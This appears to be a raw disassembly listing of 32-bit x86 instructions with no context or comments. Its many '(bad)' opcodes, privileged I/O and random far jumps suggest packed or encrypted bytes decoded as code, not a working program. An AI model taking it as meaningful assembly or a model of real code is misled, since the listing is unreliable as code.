  41859d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41859e:	ja     0x418541
  4185a0:	ret    
  4185a1:	inc    ebx
  4185a2:	imul   esp,DWORD PTR [ebx-0x161de97f],0xffffffb7
  4185a9:	(bad)  
  4185aa:	adc    al,0xd2
  4185ac:	aas    
  4185ad:	xchg   ebx,eax
  4185ae:	das    
  4185af:	(bad)  
  4185b0:	pushf  
  4185b1:	lock mov ebx,0x7c5bac85
  4185b7:	mov    edi,edi
  4185b9:	scas   eax,DWORD PTR es:[edi]
  4185ba:	pop    ss
  4185bb:	and    ah,BYTE PTR [esi]
  4185bd:	mov    al,0x98
  4185c0:	mov    ds,WORD PTR [eax+0x9e16fac]
  4185c6:	(bad)  
  4185c7:	sub    eax,ebp
  4185c9:	int3   
  4185ca:	inc    eax
  4185cb:	cld    
  4185cc:	inc    eax
  4185cd:	addr16 add ecx,edx
  4185d0:	cmc    
  4185d1:	jg     0x4185fb
  4185d3:	dec    ecx
  4185d4:	mov    ?,WORD PTR [esi+eax*4]
  4185d7:	mov    esp,0x933e1532
  4185dc:	push   ecx
  4185dd:	stc    
  4185de:	retf   0x4d38
  4185e1:	in     al,0x67
  4185e3:	xor    eax,0x9e09f277
  4185e8:	push   cs
  4185e9:	mov    ch,cl
  4185eb:	adc    BYTE PTR [eax],dl
  4185ed:	jmp    0x2098eb8f
  4185f2:	loopne 0x4185f8
  4185f4:	pop    ss
  4185f5:	in     eax,dx
  4185f6:	cli    
  4185f7:	jle    0x418598
  4185f9:	and    esp,DWORD PTR [edx-0x2c2c01cf]
  4185ff:	iret   
  418600:	mov    cl,0xf0
  418602:	loope  0x4185ae
  418604:	jb     0x418671
  418606:	inc    ebx
  418607:	adc    eax,0xa83600d4
  41860c:	aaa    
  41860d:	mov    edi,0x62be9415
  418612:	sbb    eax,DWORD PTR [edx]
  418614:	outs   dx,DWORD PTR ds:[esi]
  418615:	cmp    esi,DWORD PTR [ebx-0x65]
  418618:	unpcklps xmm6,xmm5
  41861b:	xor    al,0x85
  41861d:	popa   
  41861e:	fnstenv [ecx+0x62eefaf6]
  418624:	js     0x418602
  418626:	(bad)  fs:[edx]
  418629:	push   esi
  41862a:	inc    ebp
  41862b:	(bad)  
  41862c:	jg     0x4185b1
  41862e:	adc    dh,ch
  418630:	mov    bl,0x37
  418632:	fwait
  418633:	mov    ds:0x8ba2ae4,eax
  418639:	test   eax,0x86868503
  41863e:	xchg   edi,eax
  41863f:	add    bl,BYTE PTR [ecx+eiz*2+0x58b34882]
  418646:	cmp    BYTE PTR [ebp-0x3e636b0f],0x3b
  41864d:	ret    
  41864e:	ins    DWORD PTR es:[edi],dx
  41864f:	inc    ecx
  418650:	in     al,0x5
  418652:	sub    eax,0x210d5b13
  418657:	(bad)  
  418658:	scas   eax,DWORD PTR es:[edi]
  418659:	addr16 sti 
  41865b:	pushf  
  41865c:	adc    DWORD PTR [eax+ebx*4-0x69f9d831],esi
  418663:	jle    0x4185ff
  418665:	mov    esi,0xdd79127b
  41866a:	int    0x48
  41866c:	enter  0xdc53,0x8e
  418670:	inc    esp
  418671:	fdivr  DWORD PTR [ecx+0x21146ac6]
  418677:	in     eax,dx
  418678:	dec    edi
  418679:	scas   al,BYTE PTR es:[edi]
  41867a:	cs mov dh,0x59
  41867d:	hlt    
  41867e:	fst    st(2)
  418680:	fdivr  DWORD PTR [ecx-0x7930c374]
  418686:	pop    ebx
  418687:	sbb    DWORD PTR [eax],0x7c06e8ab
  41868d:	jge    0x418653
  41868f:	mov    edi,0x84b86213
  418694:	mov    ds:0x2aa1ef49,al
  418699:	xor    ah,BYTE PTR [ebx-0x53be5b91]
  41869f:	std    
  4186a0:	ret    0xd86f
  4186a3:	jne    0x418634
  4186a5:	cmp    al,0xed
  4186a7:	mov    bh,0xa5
  4186a9:	imul   eax,DWORD PTR [edx-0x39],0x3310dd1c
  4186b0:	adc    al,0xf2
  4186b2:	push   esi
  4186b3:	enter  0xa45,0x9c
  4186b7:	and    cl,BYTE PTR [ebx]
  4186b9:	mov    al,ds:0x3b5171e4
  4186be:	mov    edi,DWORD PTR [ecx]
  4186c0:	ror    BYTE PTR cs:[edi-0x1c4e8264],0x16
  4186c8:	dec    eax
  4186c9:	loop   0x418705
  4186cb:	dec    esi
  4186cc:	dec    esp
  4186cd:	jae    0x4186f7
  4186cf:	loopne 0x4186d6
  4186d1:	adc    ecx,ebx
  4186d3:	es inc esi
  4186d5:	les    ebx,FWORD PTR [esi+0x16]
  4186d8:	pop    ebp
  4186d9:	cmc    
  4186da:	hlt    
  4186db:	add    edx,DWORD PTR [edx-0x3]
  4186de:	ja     0x418709
  4186e0:	jbe    0x4186b4
  4186e2:	pop    edx
  4186e3:	int    0x55
  4186e5:	imul   esp,DWORD PTR [esi+0x74d8412],0x75
  4186ec:	mov    bh,BYTE PTR [ebx]
  4186ee:	mov    edi,0x5802a333
  4186f3:	stc    
  4186f4:	das    
  4186f5:	(bad)  
  4186f7:	enter  0xc923,0xb0
  4186fb:	hlt    
  4186fc:	loope  0x4186df
  4186fe:	or     eax,0x85059119
  418703:	mov    edi,DWORD PTR [eax+0x764e03a2]
  418709:	sub    bh,BYTE PTR [esi-0x3b0e43ce]
  41870f:	mov    esp,0x37ba3985
  418714:	inc    esp
  418715:	pop    edx
  418716:	aaa    
  418717:	dec    ecx
  418718:	push   cs
  418719:	mov    dh,0x39
  41871b:	jle    0x418729
  41871d:	push   ebp
  41871e:	sub    BYTE PTR [ebx+ecx*1-0x1a3ff615],ah
  418725:	add    ch,BYTE PTR [esi]
  418727:	aaa    
  418728:	addr16 xchg esp,eax
  41872a:	in     al,0xfb
  41872c:	or     DWORD PTR [esi],ebp
  41872e:	or     al,0xc8
  418730:	xor    edx,DWORD PTR [edx]
  418732:	mov    al,ds:0x24afd06a
  418737:	mov    ebp,0xb940606e
  41873c:	jno    0x418785
  41873e:	push   cs
  41873f:	xor    DWORD PTR gs:[eax-0x69],esi
  418743:	pop    ecx
  418744:	ret    0x28df
  418747:	imul   BYTE PTR [edi+0x2e56bbd6]
  41874d:	repz xchg ebx,eax
  41874f:	(bad)  
  418751:	lock mov eax,0x8383af33
  418757:	sub    al,0x68
  418759:	cmp    BYTE PTR [edx+0x5cf9a8c8],0x90
  418760:	lods   eax,DWORD PTR ds:[esi]
  418761:	pop    edi
  418762:	sar    bh,cl
  418764:	xchg   edx,eax
  418765:	daa    
  418766:	add    eax,0x63945a1b
  41876b:	(bad)  
  41876c:	push   esi
  41876d:	or     eax,0xf2dd9450
  418772:	xchg   esi,eax
  418773:	shl    BYTE PTR [edx-0x57],1
  418776:	cmp    bl,al
  418778:	inc    ebx
  418779:	mov    edx,0xf7b82e60
  41877e:	call   DWORD PTR [ecx+edx*8-0x57]
  418782:	push   0xffffff89
  418784:	add    cl,dh
  418786:	push   cs
  418787:	cs mov ecx,0x4443901e
  41878d:	loope  0x418738
  41878f:	sbb    ch,BYTE PTR [edx]
  418791:	out    0x2a,eax
  418793:	bound  eax,QWORD PTR es:[edi-0x51]
  418797:	push   DWORD PTR [eax+edi*8+0x78ec76c3]
  41879e:	gs pop esp
  4187a0:	nop
  4187a1:	fneni(8087 only) 
  4187a3:	mov    ecx,0xaa3f23e5
  4187a8:	lods   eax,DWORD PTR ds:[esi]
  4187a9:	mov    al,BYTE PTR [edi+0x40]
  4187ac:	shl    DWORD PTR [eax-0x1ed54e49],1
  4187b2:	jae    0x41873a
  4187b4:	aad    0xe8
  4187b6:	inc    ecx
  4187b7:	call   0xdf75:0x12b9c51d
  4187be:	sbb    al,0x97
  4187c0:	outs   dx,DWORD PTR ds:[esi]
  4187c1:	mov    ebp,0xe0ad03fd
  4187c6:	add    BYTE PTR [esi+0xa],cl
  4187c9:	push   0x3b
  4187cb:	pop    eax
  4187cc:	jle    0x4187c0
  4187ce:	dec    eax
  4187cf:	scas   al,BYTE PTR es:[edi]
  4187d0:	in     eax,0x6f
  4187d2:	mov    dh,0xcf
  4187d4:	xor    ch,BYTE PTR [ebp-0x219d1615]
  4187da:	mov    ah,BYTE PTR [ecx+0x41183081]
  4187e0:	cmp    ebx,DWORD PTR [edx+ecx*8+0x39]
  4187e4:	push   0x5e353643
  4187e9:	xlat   BYTE PTR ds:[ebx]
  4187ea:	mov    ecx,0xa8e981cb
  4187ef:	dec    ebx
  4187f0:	ins    BYTE PTR es:[edi],dx
  4187f1:	jnp    0x418794
  4187f3:	inc    ecx
  4187f4:	sti    
  4187f5:	sub    bh,BYTE PTR [esi-0x52]
  4187f8:	mov    al,ds:0x330882ad
  4187fd:	jmp    0x4187e9
  4187ff:	lods   eax,DWORD PTR ds:[esi]
  418800:	pop    ss
  418801:	pusha  
  418802:	pusha  
  418803:	mov    ds:0xb280b76,al
  418808:	jb     0x4187f6
  41880a:	push   ecx
  41880b:	clc    
  41880c:	call   0xf535f975
  418811:	or     DWORD PTR [esi],ecx
  418813:	(bad)  
  418814:	cld    
  418815:	or     ch,BYTE PTR [ebp+0x6c68d6a5]
  41881b:	inc    ebp
  41881c:	out    0x1f,eax
  41881e:	pop    esi
  41881f:	xchg   ebp,eax
  418820:	mov    BYTE PTR [ebp+edx*1-0x73],ah
  418824:	push   esi
  418825:	sbb    DWORD PTR [edi+edx*8],ebx
  418828:	in     al,dx
  418829:	dec    ebp
  41882a:	jo     0x4187f6
  41882c:	xchg   BYTE PTR [ebx+edi*4+0x290c3373],bh
  418833:	mov    dl,0xfb
  418835:	add    DWORD PTR [eax+0x62],esi
  418838:	cdq    
  418839:	mov    ch,0xc3
  41883b:	int3   
  41883c:	mov    al,0xc9
  41883e:	pushf  
  41883f:	and    edi,DWORD PTR [edx]
  418841:	jmp    0x41881b
  418843:	add    DWORD PTR [edx-0x5a758c87],edi
  418849:	push   0xa2cc3b78
  41884e:	cld    
  41884f:	es dec edx
  418851:	enter  0xb6f1,0x9f
  418855:	xchg   BYTE PTR [eax+0xefa982b],bl
  41885b:	mov    esi,0x725bc3a7
  418860:	dec    esp
  418861:	and    BYTE PTR [edi+ecx*2+0x1f69b853],dl
  418868:	and    DWORD PTR [ebx],ebp
  41886a:	lahf   
  41886b:	push   edi
  41886c:	add    eax,0x1547ebc
  418871:	test   eax,0xa464f1b8
  418876:	and    cl,dl
  418878:	dec    eax
  418879:	jp     0x4188bd
  41887b:	xchg   BYTE PTR [ebx-0x74],cl
  41887e:	jb     0x418899
  418880:	ret    0xdb00
  418883:	mov    bl,0xbb
  418885:	xchg   esp,eax
  418886:	jp     0x4188d7
  418888:	data16 or al,0x93
  41888b:	mov    edi,0xe6399e47
  418890:	out    0x1a,al
  418892:	dec    esi
  418893:	xchg   bl,cl
  418895:	sub    BYTE PTR [ebx+edi*8+0x29cf2248],ch
  41889c:	shl    BYTE PTR [ebp+0x3b1d54e9],1
  4188a2:	das    
  4188a3:	sbb    dl,BYTE PTR [ebp-0x200466af]
  4188a9:	or     DWORD PTR [esi+ecx*4-0x1e],0x55
  4188ae:	jo     0x4188bb
  4188b0:	mov    eax,0xb1e3b5db
  4188b5:	cdq    
  4188b6:	dec    ebx
  4188b7:	mov    edi,0x9af927ef
  4188bc:	xchg   esp,eax
  4188bd:	in     al,0x14
  4188bf:	mov    al,ds:0xaeded84d
  4188c4:	mov    al,BYTE PTR [edx+0x7d]
  4188c7:	pop    ss
  4188c8:	jno    0x4188a4
  4188ca:	fist   WORD PTR [esp+edi*8-0x353f13c9]
  4188d1:	aam    0xff
  4188d3:	jns    0x4188be
  4188d5:	loopne 0x418916
  4188d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d8:	lods   eax,DWORD PTR ds:[esi]
  4188da:	push   esi
  4188db:	cdq    
  4188dc:	add    DWORD PTR [ebx],0xfffffffb
  4188df:	inc    ecx
  4188e0:	hlt    
  4188e1:	jmp    0x418920
  4188e3:	or     BYTE PTR [esi-0x60b23b00],al
  4188e9:	jmp    0x4f7b5f58
  4188ee:	repnz rcr BYTE PTR [eax-0x6e5ef06d],1
  4188f5:	fs ret 
  4188f7:	dec    edx
  4188f8:	push   cs
  4188f9:	clc    
  4188fa:	imul   esi,DWORD PTR ds:[eax+0x14],0x2c
  4188ff:	pop    esi
  418900:	inc    ebp
  418901:	mov    al,0x89
  418903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418904:	dec    esi
  418905:	push   ss
  418906:	(bad)  
  418907:	stc    
  418908:	mov    cl,0x59
  41890a:	(bad)
  41890e:	fisttp QWORD PTR [ebp+ebp*8+0xc5d5b5]
  418915:	or     al,0x6e
  418917:	xlat   BYTE PTR ds:[ebx]
  418918:	mov    cl,0xa6
  41891a:	jp     0x4188a9
  41891c:	es das 
  41891e:	cmp    BYTE PTR [eax+0x14cfd30f],bh
  418924:	mov    edi,0x903548d7
  418929:	cmp    BYTE PTR [ebp+0xeebccca],0x6f
  418930:	mov    ebp,0xbc990b70
  418935:	(bad)  
  418937:	(bad)  
  418938:	mov    cl,0x3b
  41893a:	ins    DWORD PTR es:[edi],dx
  41893b:	ret    0x26f7
  41893e:	int    0x4e
  418940:	pop    ss
  418941:	mov    dl,0x1a
  418943:	iret   
  418944:	in     al,dx
  418945:	mov    ch,0x81
  418947:	jecxz  0x418916
  418949:	add    DWORD PTR [eax+0x51],ecx
  41894c:	or     al,0xf5
  41894e:	(bad)  
  41894f:	int3   
  418950:	iret   
  418951:	sbb    al,0xbb
  418953:	les    ebp,FWORD PTR [edi]
  418955:	mov    edi,0x1c788596
  41895a:	inc    eax
  41895b:	jne    0x418945
  41895d:	ins    BYTE PTR es:[edi],dx
  41895e:	sahf   
  41895f:	or     ebx,DWORD PTR [edx]
  418961:	sub    ecx,DWORD PTR [esi]
  418963:	jp     0x4189e2
  418965:	xor    ebp,DWORD PTR [eax-0x2757ab94]
  41896b:	and    eax,0x68169944
  418970:	push   0xcd924ab1
  418975:	jo     0x418909
  418977:	xlat   BYTE PTR ds:[ebx]
  418978:	pop    eax
  418979:	mov    ebp,0xd0ba3b63
  41897e:	ret    
  41897f:	adc    eax,0x7cb14f67
  418984:	or     ecx,DWORD PTR [edi+0x32aa4093]
  41898a:	ficomp DWORD PTR [edi+0x4c851749]
  418990:	(bad)  
  418991:	or     dh,0x7c
  418994:	inc    esi
  418995:	add    al,0xae
  418997:	and    DWORD PTR [ecx-0x3],0x57cb7957
  41899e:	cld    
  41899f:	(bad)  
  4189a1:	pop    ss
  4189a2:	pop    esi
  4189a3:	test   BYTE PTR [edx],ch
  4189a5:	xchg   edx,eax
  4189a6:	dec    esi
  4189a7:	push   0x129581ac
  4189ac:	pop    esi
  4189ad:	adc    ah,BYTE PTR [eax+0x77]
  4189b0:	jp     0x418976
  4189b2:	xchg   DWORD PTR [esp+edi*2],ebp
  4189b5:	inc    DWORD PTR [edx+eax*2+0x2ca6b2e6]
  4189bc:	imul   esp,DWORD PTR [esi+0x29266df1],0xd59e030d
  4189c6:	and    esi,DWORD PTR [edi-0x65]
  4189c9:	out    0x44,eax
  4189cb:	jb     0x41895f
  4189cd:	cld    
  4189ce:	cmp    ebp,ebx
  4189d0:	adc    ebx,DWORD PTR [edx]
  4189d2:	(bad)  
  4189d3:	and    dh,BYTE PTR [esi+0xe]
  4189d6:	sub    DWORD PTR [ebx],ebx
  4189d8:	(bad)  [esi]
  4189da:	mov    ah,0x37
  4189dc:	fld    QWORD PTR [esi]
  4189df:	inc    esi
  4189e1:	hlt    
  4189e2:	ins    BYTE PTR es:[edi],dx
  4189e3:	cmp    eax,0x8fa519e1
  4189e8:	xchg   BYTE PTR [bp+si],ah
  4189eb:	and    cl,BYTE PTR [eax]
  4189ed:	or     ch,al
  4189ef:	mov    ds:0xdc4ef305,al
  4189f4:	fldenv [edi+0x239d33b1]
  4189fa:	xchg   al,cl
  4189fc:	lock push edx
  4189fe:	and    DWORD PTR [esi],eax
  418a00:	dec    ebp
  418a01:	nop
  418a02:	or     bl,BYTE PTR [ecx-0x8]
  418a05:	stos   BYTE PTR es:[edi],al
  418a06:	pop    eax
  418a07:	and    ecx,DWORD PTR [edi]
  418a09:	and    al,0x4e
  418a0b:	mov    al,0xd3
  418a0d:	(bad)  
  418a0e:	jecxz  0x418a84
  418a10:	clc    
  418a11:	sub    eax,0xfd8f9cc2
  418a16:	jno    0x418a65
  418a18:	xchg   esi,eax
  418a19:	mov    ebx,fs
  418a1b:	pushf  
  418a1c:	cmp    DWORD PTR [eax-0x56],0x27114b49
  418a23:	push   edx
  418a24:	sub    al,0x71
  418a26:	call   0xa422:0xb58bb04a
  418a2d:	icebp  
  418a2e:	add    eax,0xb69681cd
  418a33:	icebp  
  418a34:	sub    dh,BYTE PTR [ecx]
  418a36:	push   ds
  418a37:	mov    al,0xba
  418a39:	pop    ds
  418a3a:	iret   
  418a3b:	inc    ecx
  418a3c:	shr    DWORD PTR [eax*1+0xc588e45],cl
  418a43:	sbb    dl,ch
  418a45:	out    0x73,eax
  418a47:	test   DWORD PTR ds:0x138a052d,edx
  418a4d:	mov    WORD PTR [ebp+0x3b814c5d],?
  418a53:	jecxz  0x418a22
  418a55:	push   eax
  418a56:	imul   edi,DWORD PTR [eax],0xffffffa3
  418a59:	push   es
  418a5a:	xchg   ecx,eax
  418a5b:	cmp    edx,DWORD PTR [edi-0x1d]
  418a5e:	fild   WORD PTR [ebp+eiz*8-0x3d546120]
  418a65:	es out 0xba,al
  418a68:	lods   al,BYTE PTR ds:[esi]
  418a69:	cmp    eax,0x7e1089c0
  418a6e:	shl    DWORD PTR [edi-0x5c],cl
  418a71:	add    al,0x6d
  418a73:	dec    ebp
  418a74:	jge    0x418a90
  418a76:	lahf   
  418a77:	pop    es
  418a78:	cdq    
  418a79:	xor    dh,BYTE PTR [ecx+eax*1-0x48703a4a]
  418a80:	dec    edx
  418a81:	test   al,0x27
  418a83:	test   al,0xe8
  418a85:	xor    al,0x8b
  418a87:	mov    al,0x47
  418a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a8a:	sub    DWORD PTR [ecx+0x7b],edx
  418a8d:	dec    ecx
  418a8e:	int3   
  418a8f:	cwde   
  418a90:	inc    ebp
  418a91:	xor    al,0x99
  418a93:	dec    ebx
  418a94:	sbb    al,0x66
  418a96:	mov    eax,0x311a9232
  418a9b:	outs   dx,DWORD PTR ds:[esi]
  418a9c:	js     0x418a84
  418a9e:	int    0x38
  418aa0:	mov    ebp,0x7af4a76b
  418aa5:	std    
  418aa6:	cmp    BYTE PTR [ebx+edi*4+0x1807da20],dh
  418aad:	pop    eax
  418aae:	add    BYTE PTR [eax-0x681267e6],al
  418ab4:	mov    cl,dl
  418ab6:	mov    WORD PTR [edi-0x6cf9d287],ds
  418abc:	push   0x65
  418abe:	shl    DWORD PTR [esi],1
  418ac0:	outs   dx,BYTE PTR ds:[esi]
  418ac1:	xor    ebp,DWORD PTR [esi+ebp*8-0x480b6e56]
  418ac8:	ret    
  418ac9:	aam    0x85
  418acb:	mov    ?,WORD PTR [eax+0x17]
  418ace:	test   BYTE PTR [edx+0x55],0x3c
  418ad2:	adc    BYTE PTR [edx-0x26],0x4a
  418ad6:	out    0xea,eax
  418ad8:	lds    ecx,FWORD PTR [eax]
  418ada:	(bad)  
  418adb:	stos   DWORD PTR es:[edi],eax
  418adc:	pop    edi
  418add:	fbstp  TBYTE PTR [esi+eiz*4]
  418ae0:	and    DWORD PTR [edi+0x76c76510],ebx
  418ae6:	mul    BYTE PTR [esi+0x72]
  418ae9:	cmp    BYTE PTR [edx+0x4c],al
  418aec:	stos   BYTE PTR es:[edi],al
  418aed:	mov    ss,WORD PTR fs:[edx]
  418af0:	or     eax,0x22a14f1f
  418af5:	in     al,0x59
  418af7:	fdivr  QWORD PTR [edi]
  418af9:	mov    DWORD PTR [edi+0x6c],edx
  418afc:	data16 je 0x418afd
  418aff:	sbb    dh,bh
  418b01:	jnp    0x418b63
  418b03:	test   eax,0xdbf35070
  418b08:	cmp    al,0x1c
  418b0a:	adc    eax,0x4db46ddd
  418b0f:	(bad)  
  418b11:	fadd   QWORD PTR [edx+0x16]
  418b14:	pop    edx
  418b15:	pushf  
  418b16:	or     al,bh
  418b18:	mov    ah,BYTE PTR [ecx-0x60]
  418b1b:	popf   
  418b1c:	jmp    0x418aa9
  418b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b1f:	mov    al,ds:0x367ee54d
  418b24:	mov    cl,0x9a
  418b26:	imul   ecx,ebp,0xcf792bad
  418b2c:	pop    edx
  418b2d:	(bad)  
  418b2e:	push   ss
  418b2f:	lods   al,BYTE PTR ds:[esi]
  418b30:	in     eax,dx
  418b31:	dec    edx
  418b32:	and    dl,al
  418b34:	jne    0x418b03
  418b36:	pop    es
  418b37:	imul   edi,DWORD PTR [esi],0xffffffd2
  418b3a:	mov    al,0xb
  418b3c:	cmp    al,dh
  418b3e:	lock sub al,0x5
  418b41:	sub    eax,0xd458627d
  418b46:	(bad)  
  418b47:	hlt    
  418b48:	jmp    0x418bb5
  418b4a:	xor    dl,dl
  418b4c:	mov    al,0xc7
  418b4e:	nop
  418b4f:	imul   edx,DWORD PTR [edi],0xffffffd3
  418b52:	cmc    
  418b53:	add    esi,DWORD PTR [edi+0x4a]
  418b56:	jmp    0x7f5aa54f
  418b5b:	dec    ebp
  418b5c:	out    0xdc,eax
  418b5e:	js     0x418bb2
  418b60:	cmp    ebx,DWORD PTR [esi+0x42962e3e]
  418b66:	or     ebp,ecx
  418b68:	jae    0x418b55
  418b6a:	scas   al,BYTE PTR es:[edi]
  418b6b:	shld   edx,edx,0xce
  418b6f:	and    BYTE PTR [eax-0x3b],0xfb
  418b73:	cmp    BYTE PTR [ebx],0x39
  418b76:	adc    ch,cl
  418b78:	or     eax,0x12372268
  418b7d:	repz dec ebx
  418b7f:	sar    DWORD PTR [edi+0x23],cl
  418b82:	and    al,0xdf
  418b84:	fcomi  st,st(3)
  418b86:	and    dl,BYTE PTR [edx]
  418b88:	leave  
  418b89:	jbe    0x418b89
  418b8b:	int3   
  418b8c:	jne    0x418b41
  418b8e:	adc    al,0xec
  418b90:	xchg   BYTE PTR [eax],dh
  418b92:	clc    
  418b93:	sahf   
  418b94:	sub    ecx,DWORD PTR [eax-0x6377ea11]
  418b9a:	lahf   
  418b9b:	stos   DWORD PTR es:[edi],eax
  418b9c:	in     eax,dx
  418b9d:	imul   dl
  418b9f:	pop    edx
  418ba0:	and    eax,0xda5aa431
  418ba5:	dec    ecx
  418ba6:	inc    ecx
  418ba7:	lds    eax,FWORD PTR [ebp+esi*2+0x3d]
  418bab:	pop    ebp
  418bac:	aas    
  418bad:	retf   
  418bae:	and    al,0x38
  418bb0:	pop    es
  418bb1:	and    DWORD PTR [esi+0x2c],edx
  418bb4:	xchg   DWORD PTR [ebx-0x3586c41c],ebp
  418bba:	jo     0x418b75
  418bbc:	ffree  st(2)
  418bbe:	push   esp
  418bbf:	aam    0x43
  418bc1:	sbb    edi,DWORD PTR [ebp+0xcfa90b]
  418bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc8:	and    BYTE PTR [esi+0x1f3d3505],0x0
  418bcf:	pop    ecx
  418bd0:	loope  0x418b92
  418bd2:	cmp    BYTE PTR [edi+eax*8],0x2c
  418bd6:	data16 sar BYTE PTR [eax-0x8],0x9
  418bdb:	mov    eax,ds:0x187dcba
  418be0:	in     al,0x3a
  418be2:	arpl   WORD PTR [ecx+0xa],bx
  418be5:	stc    
  418be6:	adc    al,BYTE PTR [esi-0x58328cd0]
  418bec:	add    BYTE PTR [ecx-0x37],bh
  418bef:	jbe    0x418c0b
  418bf1:	fild   QWORD PTR [edx+0x6c2342c7]
  418bf7:	or     BYTE PTR [eax-0x5a],ah
  418bfa:	xchg   DWORD PTR [esi-0x4f],edi
  418bfd:	rol    DWORD PTR [edx-0x11c0709b],1
  418c03:	out    dx,al
  418c04:	dec    edx
  418c05:	iret   
  418c06:	jge    0x418beb
  418c08:	aam    0xc9
  418c0a:	push   edx
  418c0b:	mov    eax,ds:0x3b65cf24
  418c10:	mov    edx,0xc06c38e3
  418c15:	or     bh,ah
  418c17:	pop    eax
  418c18:	inc    BYTE PTR [edx+0x6bdf9ba5]
  418c1e:	fmul   DWORD PTR [ebp+0x37]
  418c21:	repnz test BYTE PTR [ebx-0x4e],ch
  418c25:	arpl   ax,ax
  418c27:	jecxz  0x418c73
  418c29:	adc    al,0x36
  418c2b:	jl     0x418be2
  418c2d:	loop   0x418baf
  418c2f:	inc    edi
  418c30:	imul   ebx,DWORD PTR [ecx],0x1e177611
  418c36:	pop    ebx
  418c37:	cmp    eax,DWORD PTR [ecx+edx*2]
  418c3a:	lods   al,BYTE PTR ds:[esi]
  418c3b:	mov    dl,0xec
  418c3d:	aaa    
  418c3e:	mov    al,ds:0x6e447aee
  418c43:	(bad)  [eax]
  418c45:	shl    DWORD PTR [ecx-0x61e84189],0x9d
  418c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c4d:	sbb    edi,ebp
  418c4f:	ja     0x418c55
  418c51:	push   ebp
  418c52:	xchg   edi,eax
  418c53:	xor    edx,ebp
  418c55:	sbb    bh,BYTE PTR [eax-0x56]
  418c58:	loop   0x418cc0
  418c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c5b:	adc    DWORD PTR [edx+0x3b26379d],0x34ced18a
  418c65:	push   cs
  418c66:	xor    ch,BYTE PTR [esi-0x25]
  418c69:	test   ebp,eax
  418c6b:	lods   al,BYTE PTR ds:[esi]
  418c6c:	inc    edx
  418c6d:	inc    ecx
  418c6e:	jg     0x418c54
  418c70:	mov    ch,0x1
  418c72:	ss std 
  418c74:	(bad)  
  418c76:	aad    0xac
  418c78:	test   al,0xc
  418c7a:	cli    
  418c7b:	mov    bl,0x21
  418c7d:	rcl    DWORD PTR [ebx-0x8493039],cl
  418c83:	addr16 es int3 
  418c86:	sbb    al,0xd8
  418c88:	pop    edx
  418c89:	mov    ds:0x1b54e2,eax
  418c8e:	mov    DWORD PTR [eax],ebp
  418c90:	test   al,0x32
  418c92:	dec    esp
  418c93:	sub    al,0xa6
  418c95:	out    dx,al
  418c96:	push   0x47c08560
  418c9b:	mov    ebp,DWORD PTR [ebp+0x7f]
  418c9e:	push   ebx
  418c9f:	pop    ds
  418ca0:	fbstp  TBYTE PTR [edi]
  418ca2:	lods   al,BYTE PTR ds:[esi]
  418ca3:	test   al,0xde
  418ca5:	push   es
  418ca6:	jb     0x418c4b
  418ca8:	popa   
  418ca9:	or     BYTE PTR [ebp+0xa607721],dl
  418caf:	test   al,0x7
  418cb1:	inc    edi
  418cb2:	dec    edx
  418cb3:	mov    ds:0xeec31435,al
  418cb8:	push   cs
  418cb9:	mov    esp,DWORD PTR [ebp-0x22]
  418cbc:	clc    
  418cbd:	mov    eax,ebx
  418cbf:	dec    ebx
  418cc0:	inc    edx
  418cc1:	shl    bh,1
  418cc3:	test   BYTE PTR es:[ecx],ch
  418cc6:	sti    
  418cc7:	scas   eax,DWORD PTR es:[edi]
  418cc8:	dec    esp
  418cc9:	mov    ch,0x10
  418ccb:	pop    edx
  418ccc:	das    
  418ccd:	or     BYTE PTR ds:0x986e03b,dh
  418cd3:	gs pop edi
  418cd5:	test   eax,0x6dd4cc6c
  418cda:	adc    DWORD PTR [edx-0x3c],esi
  418cdd:	xchg   esi,eax
  418cde:	arpl   WORD PTR [eax+0x68],ax
  418ce1:	mov    esp,0x806fb62c
  418ce6:	jecxz  0x418d07
  418ce8:	test   ah,0xb6
  418ceb:	mov    esi,0xc1109b2f
  418cf0:	push   ss
  418cf1:	enter  0x3559,0x38
  418cf5:	pop    es
  418cf6:	push   esp
  418cf7:	inc    ebp
  418cf8:	dec    ecx
  418cf9:	mov    cs,ebx
  418cfb:	mov    DWORD PTR [edi-0x2d],edi
  418cfe:	and    al,0x92
  418d00:	in     al,0x7d
  418d02:	shl    ebp,cl
  418d04:	jno    0x418d27
  418d06:	mov    es,WORD PTR [ecx-0x31a1865f]
  418d0c:	cdq    
  418d0d:	iret   
  418d0e:	xor    BYTE PTR [esi],0x72
  418d11:	mov    ah,0xab
  418d13:	in     eax,0x68
  418d15:	cmp    al,0xac
  418d17:	pop    esp
  418d18:	lods   eax,DWORD PTR ds:[esi]
  418d19:	sti    
  418d1a:	dec    eax
  418d1b:	xor    eax,0xfd883db7
  418d20:	jg     0x418d92
  418d22:	jg     0x418d53
  418d24:	xchg   ebx,eax
  418d25:	iret   
  418d26:	cwde   
  418d27:	pop    ebp
  418d28:	es out 0x78,al
  418d2b:	pusha  
  418d2c:	(bad)  
  418d2d:	sub    eax,0xb875b361
  418d32:	or     DWORD PTR [eax+edi*2],edi
  418d35:	loope  0x418d52
  418d37:	daa    
  418d38:	mov    ds:0x207ec6b0,al
  418d3d:	outs   dx,DWORD PTR ds:[esi]
  418d3e:	icebp  
  418d3f:	test   eax,edx
  418d41:	xlat   BYTE PTR ds:[ebx]
  418d42:	dec    eax
  418d43:	jno    0x418d4f
  418d45:	jbe    0x418ce8
  418d47:	out    0x8,eax
  418d49:	outs   dx,DWORD PTR ds:[esi]
  418d4a:	adc    ebp,DWORD PTR [esi]
  418d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d4d:	pop    ds
  418d4e:	scas   al,BYTE PTR es:[edi]
  418d4f:	lock mov cl,0xfb
  418d52:	cmp    BYTE PTR [ebx-0x50ef24fb],0x59
  418d59:	xor    DWORD PTR [edi+0x7c],esp
  418d5c:	loop   0x418ce1
  418d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d5f:	not    BYTE PTR [eax]
  418d61:	dec    esi
  418d62:	xor    esp,eax
  418d64:	inc    ebp
